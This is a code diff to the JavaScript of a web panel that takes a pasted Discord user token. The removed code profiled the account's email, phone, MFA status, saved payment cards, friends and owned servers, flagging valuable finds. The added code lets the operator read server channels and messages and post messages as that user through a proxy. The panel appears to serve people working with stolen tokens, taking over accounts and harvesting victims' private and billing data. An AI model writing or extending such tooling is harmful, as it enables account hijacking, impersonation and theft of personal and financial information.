@@ -111,79 +111,153 @@ function reltime(iso) {
   return Math.floor(diff / 86400000) + 'd'
 }
 
+let dcToken = ''
+let dcUser = null
+let dcGuilds = []
+let dcSelectedGuild = null
+let dcSelectedChannel = null
+let dcChannels = []
+let dcMessages = []
+
 function switchTab(name) {
   document.querySelectorAll('.stab').forEach(b => b.classList.toggle('active', b.dataset.tab === name))
   document.getElementById('tab-clients').style.display = name === 'clients' ? '' : 'none'
-  document.getElementById('tab-token').style.display = name === 'token' ? '' : 'none'
+  const ttab = document.getElementById('tab-token')
+  ttab.style.display = name === 'token' ? '' : 'none'
+  ttab.classList.toggle('active', name === 'token')
   document.getElementById('welcome').style.display = name === 'clients' ? '' : 'none'
   document.getElementById('detail').classList.toggle('show', false)
-  document.getElementById('tokenResult').style.display = name === 'token' ? '' : 'none'
+  document.getElementById('dcClient').style.display = 'none'
+  if (name === 'token' && dcToken && dcUser) {
+    document.getElementById('dcClient').style.display = 'flex'
+  }
 }
 
-async function lookupToken() {
+async function dcProxy(method, path, body) {
+  const r = await fetch('/api/discord/proxy', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ token: dcToken, method, path, dbody: body || undefined })
+  })
+  const j = await r.json()
+  if (j.ok) return j.data
+  throw new Error(j.data && j.data.message ? j.data.message : 'request failed')
+}
+
+async function discordLogin() {
   const token = document.getElementById('tokenInput').value.trim()
   if (!token) { toast('paste a token first'); return }
   const status = document.getElementById('tokenStatus')
-  const result = document.getElementById('tokenResult')
-  status.textContent = 'looking up...'
+  status.textContent = 'connecting...'
   status.style.color = '#888'
   try {
     const r = await fetch('/api/discord/lookup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) })
     const j = await r.json()
-    if (j.ok) {
-      const d = j.data
-      status.textContent = 'success'
-      status.style.color = '#44cc88'
-      let html = ''
-      if (d.user) {
-        const u = d.user
-        html += '<div class="sechead">User</div>'
-        html += '<div class="hit">' + esc(u.username + '#' + (u.discriminator || '0')) + '</div>'
-        html += '<div>ID: ' + esc(u.id) + '</div>'
-        html += '<div>Email: ' + esc(u.email || 'none') + (u.verified ? ' ✓' : ' ✗') + '</div>'
-        html += '<div>Phone: ' + esc(u.phone || 'none') + '</div>'
-        html += '<div>MFA: ' + (u.mfa_enabled ? '✓ enabled' : '✗ disabled') + '</div>'
-        html += '<div>Nitro: ' + (u.premium_type ? (u.premium_type === 2 ? 'Nitro' : 'Nitro Classic') : 'none') + '</div>'
-        if (d.subscriptions && d.subscriptions.length > 0) {
-          html += '<div class="sechead">Subscriptions</div>'
-          for (const s of d.subscriptions) html += '<div>' + esc(s.plan_id || s.id) + ' - ' + esc(s.status) + (s.current_period_end ? ' until ' + new Date(s.current_period_end).toLocaleDateString() : '') + '</div>'
-        }
-        if (d.billing && d.billing.length > 0) {
-          html += '<div class="sechead">Billing (' + d.billing.length + ')</div>'
-          for (const b of d.billing) html += '<div>' + esc(b.brand || '?') + ' •••• ' + esc(b.last_4 || '????') + (b.billing_address ? ' - ' + esc(b.billing_address.country || '') : '') + '</div>'
-        } else if (d.billing !== null) html += '<div>No billing saved</div>'
-        if (d.guilds && d.guilds.length > 0) {
-          html += '<div class="sechead">Guilds (' + d.guilds.length + ')</div>'
-          const owned = d.guilds.filter(g => g.owner)
-          if (owned.length > 0) {
-            html += '<div class="sechead">★ Owned (' + owned.length + ')</div>'
-            for (const g of owned) html += '<div class="hit">' + esc(g.name) + ' (' + esc(g.id) + ') - ' + (g.approximate_member_count || '?') + ' members</div>'
-          }
-          for (const g of d.guilds.filter(g => !g.owner).slice(0, 20)) html += '<div>' + esc(g.name) + ' (' + esc(g.id) + ')</div>'
-          if (d.guilds.filter(g => !g.owner).length > 20) html += '<div>... and ' + (d.guilds.filter(g => !g.owner).length - 20) + ' more</div>'
-        }
-        if (d.friends && d.friends.length > 0) {
-          html += '<div class="sechead">Friends (' + d.friends.length + ')</div>'
-          for (const f of d.friends) {
-            if (f.user) html += '<div>' + esc(f.user.username + '#' + (f.user.discriminator || '0')) + ' [' + esc(f.type === 1 ? 'friend' : f.type === 2 ? 'blocked' : f.type === 3 ? 'incoming' : 'outgoing') + ']</div>'
-          }
-        }
-        if (d.connections && d.connections.length > 0) {
-          html += '<div class="sechead">Connections (' + d.connections.length + ')</div>'
-          for (const c of d.connections) html += '<div>' + esc(c.type) + ': ' + esc(c.name) + (c.verified ? ' ✓' : '') + '</div>'
-        }
-      }
-      result.innerHTML = html
-      result.style.display = ''
-      document.getElementById('welcome').style.display = 'none'
-    } else {
-      status.textContent = j.error || 'invalid token'
-      status.style.color = '#e94560'
-      result.style.display = 'none'
-    }
+    if (!j.ok) { status.textContent = j.error || 'invalid token'; status.style.color = '#e94560'; return }
+    const d = j.data
+    dcToken = token
+    dcUser = d.user
+    dcGuilds = d.guilds || []
+    const u = d.user
+    status.textContent = '✓ ' + esc(u.username || 'connected')
+    status.style.color = '#44cc88'
+    document.getElementById('dcHeader').textContent = esc(u.username) + '#' + (u.discriminator || '0') + ' — ' + dcGuilds.length + ' guilds'
+    document.getElementById('dcClient').style.display = 'flex'
+    document.getElementById('welcome').style.display = 'none'
+    renderGuildList()
   } catch (e) {
     status.textContent = 'error: ' + e.message
     status.style.color = '#e94560'
+  }
+}
+
+function renderGuildList() {
+  const el = document.getElementById('dcGuildList')
+  el.innerHTML = ''
+  for (const g of dcGuilds) {
+    const div = document.createElement('div')
+    div.className = 'dc-guild' + (dcSelectedGuild === g.id ? ' active' : '')
+    const owner = g.owner ? ' ★' : ''
+    div.innerHTML = '<div class="gname">' + esc(g.name) + owner + '</div><div class="gmeta">' + (g.approximate_member_count || '?') + ' members</div>'
+    div.onclick = () => selectGuild(g.id)
+    el.appendChild(div)
+  }
+}
+
+async function selectGuild(gid) {
+  dcSelectedGuild = gid
+  dcSelectedChannel = null
+  dcMessages = []
+  renderGuildList()
+  document.getElementById('dcMessages').innerHTML = '<div style="color:#444;padding:20px;text-align:center">loading channels...</div>'
+  document.getElementById('dcInputArea').style.display = 'none'
+  try {
+    const guild = dcGuilds.find(g => g.id === gid)
+    const gname = guild ? guild.name : '?'
+    document.getElementById('dcHeader').textContent = esc(dcUser.username) + '#' + (dcUser.discriminator || '0') + ' — ' + esc(gname)
+    dcChannels = await dcProxy('GET', '/api/v9/guilds/' + gid + '/channels')
+    renderChannelList()
+  } catch (e) {
+    document.getElementById('dcMessages').innerHTML = '<div style="color:#e94560;padding:20px;text-align:center">' + esc(e.message) + '</div>'
+  }
+}
+
+function renderChannelList() {
+  const el = document.getElementById('dcChannelList')
+  el.innerHTML = ''
+  const textChannels = dcChannels.filter(c => c.type === 0)
+  for (const c of textChannels) {
+    const span = document.createElement('span')
+    span.className = 'dc-channel' + (dcSelectedChannel === c.id ? ' active' : '')
+    span.textContent = '# ' + c.name
+    span.onclick = () => selectChannel(c.id)
+    el.appendChild(span)
+  }
+  if (textChannels.length === 0) el.innerHTML = '<span style="color:#444;padding:8px;font-size:12px">no text channels</span>'
+}
+
+async function selectChannel(cid) {
+  dcSelectedChannel = cid
+  dcMessages = []
+  renderChannelList()
+  const el = document.getElementById('dcMessages')
+  el.innerHTML = '<div style="color:#444;padding:20px;text-align:center">loading messages...</div>'
+  document.getElementById('dcInputArea').style.display = 'flex'
+  try {
+    dcMessages = await dcProxy('GET', '/api/v9/channels/' + cid + '/messages?limit=50')
+    renderMessages()
+  } catch (e) {
+    el.innerHTML = '<div style="color:#e94560;padding:20px;text-align:center">' + esc(e.message) + '</div>'
+  }
+}
+
+function renderMessages() {
+  const el = document.getElementById('dcMessages')
+  let html = ''
+  for (const m of dcMessages.slice().reverse()) {
+    const author = m.author ? m.author.username : '?'
+    const time = new Date(m.timestamp).toLocaleTimeString()
+    let content = esc(m.content || '')
+    if (m.attachments && m.attachments.length > 0) {
+      for (const a of m.attachments) content += ' [attachment: ' + esc(a.filename) + ']'
+    }
+    html += '<div class="dc-msg"><span class="mauthor">' + esc(author) + '</span><span class="mtime">' + time + '</span><div class="mcontent">' + content + '</div></div>'
+  }
+  if (!html) html = '<div style="color:#444;text-align:center;padding:20px">no messages</div>'
+  el.innerHTML = html
+  el.scrollTop = el.scrollHeight
+}
+
+async function dcSendMsg() {
+  const input = document.getElementById('dcMsgInput')
+  const text = input.value.trim()
+  if (!text || !dcSelectedChannel) return
+  input.value = ''
+  try {
+    const msg = await dcProxy('POST', '/api/v9/channels/' + dcSelectedChannel + '/messages', { content: text })
+    dcMessages.push(msg)
+    renderMessages()
+  } catch (e) {
+    toast('send failed: ' + e.message)
   }
 }
 
